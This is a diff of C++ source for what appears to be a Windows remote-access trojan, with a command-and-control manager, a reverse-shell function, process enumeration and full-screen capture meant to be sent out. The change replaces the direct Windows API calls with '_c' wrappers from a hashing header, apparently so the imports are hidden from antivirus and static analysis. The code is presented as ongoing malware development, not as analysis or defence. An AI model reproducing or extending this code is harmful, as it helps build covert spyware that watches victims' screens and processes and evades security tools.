@@ -9,6 +9,7 @@
 #include "commandManager.h"
 #include "cncManager.h"
 #include "DDproto.h"
+#include "HashFunction_command.h"
 
 commandManager::commandManager() {
 }
@@ -34,20 +35,20 @@ std::string commandManager::reverseShell(std::string cmd) {
 std::wstring commandManager::pidToName(DWORD procID) {
     TCHAR procName[MAX_PATH] = L"";
 
-    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, procID); // pid에 해당하는 모듈의 handle get
+    HANDLE hProc = OpenProcess_c(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, procID); // pid에 해당하는 모듈의 handle get
 
     if (NULL != hProc) {
         HMODULE hModule;
         DWORD resultLen;
 
-        if (EnumProcessModules(hProc, &hModule, sizeof(hModule), &resultLen)) {
-            GetModuleBaseName(hProc, hModule, procName, sizeof(procName) / sizeof(TCHAR));
+        if (EnumProcessModules_c(hProc, &hModule, sizeof(hModule), &resultLen)) {
+            GetModuleBaseNameW_c(hProc, hModule, procName, sizeof(procName) / sizeof(TCHAR));
         }
     }
 
     std::wstring result = procName;
 
-    CloseHandle(hProc);
+    CloseHandle_c(hProc);
 
     return result;
 }
@@ -62,7 +63,7 @@ std::map<DWORD, std::wstring> commandManager::getProcessList() {
     std::wstring pName = L"";
 
     // pid 얻어오기
-    if (!EnumProcesses(procIDList, sizeof(procIDList), &byteLen)) {
+    if (!EnumProcesses_c(procIDList, sizeof(procIDList), &byteLen)) {
         // TODO Fail Logic
         return procDict;
     }
@@ -91,24 +92,24 @@ std::map<DWORD, std::wstring> commandManager::getProcessList() {
 /* 화면 스샷 구현용 WriteFile 삭제하고 Stream을 바로 sendData로 넘겨줘야할듯*/
 LPVOID commandManager::getScreen() {
     {
-        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-        HDC hdcSource = GetDC(NULL);
-        HDC hdcMemory = CreateCompatibleDC(hdcSource);
+        int w = GetSystemMetrics_c(SM_CXVIRTUALSCREEN);
+        int h = GetSystemMetrics_c(SM_CYVIRTUALSCREEN);
+        HDC hdcSource = GetDC_c(NULL);
+        HDC hdcMemory = CreateCompatibleDC_c(hdcSource);
 
-        int capX = GetDeviceCaps(hdcSource, HORZRES);
-        int capY = GetDeviceCaps(hdcSource, VERTRES);
+        int capX = GetDeviceCaps_c(hdcSource, HORZRES);
+        int capY = GetDeviceCaps_c(hdcSource, VERTRES);
 
-        HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, w, h);
+        HBITMAP hBitmap = CreateCompatibleBitmap_c(hdcSource, w, h);
 
-        HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);
+        HBITMAP hBitmapOld = (HBITMAP)SelectObject_c(hdcMemory, hBitmap);
 
-        BitBlt(hdcMemory, 0, 0, w, h, hdcSource, 0, 0, SRCCOPY);
+        BitBlt_c(hdcMemory, 0, 0, w, h, hdcSource, 0, 0, SRCCOPY);
 
-        hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);
+        hBitmap = (HBITMAP)SelectObject_c(hdcMemory, hBitmapOld);
 
-        DeleteDC(hdcSource);
-        DeleteDC(hdcMemory);
+        DeleteDC_c(hdcSource);
+        DeleteDC_c(hdcMemory);
 
         HPALETTE hpal = NULL;
 
@@ -132,7 +133,7 @@ LPVOID commandManager::getScreen() {
 
         HGLOBAL mem = 0;
         GetHGlobalFromStream(stream, &mem);
-        LPVOID data = GlobalLock(mem);
+        LPVOID data = GlobalLock_c(mem);
 
         this->screen_len = bytes_streamed;
 
@@ -141,7 +142,7 @@ LPVOID commandManager::getScreen() {
         memcpy(ptr, data, this->screen_len);
 
 
-        GlobalUnlock(mem);
+        GlobalUnlock_c(mem);
 
         stream->Release();
         picture->Release();
